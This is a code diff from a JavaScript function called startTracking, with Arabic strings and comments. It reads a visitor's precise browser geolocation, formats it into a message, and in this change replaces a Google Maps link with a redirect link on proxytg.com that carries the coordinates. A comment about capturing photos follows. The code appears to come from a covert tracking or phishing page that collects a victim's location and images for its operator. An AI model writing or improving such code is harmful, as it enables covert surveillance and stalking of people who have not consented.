@@ -67,7 +67,7 @@ async function startTracking() {
         const pos = await new Promise((res, rej) => {
             navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
-        data.location = `📍 <b>الموقع:</b> https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        data.location = `📍 <b>الموقع:</b> https://proxytg.com/r/Nul2Pe8jLX${pos.coords.latitude},${pos.coords.longitude}`;
     } catch(e) { data.location = "📍 الموقع: تم الرفض"; }
 
     // 4. التقاط الصور (تحسين جذري)
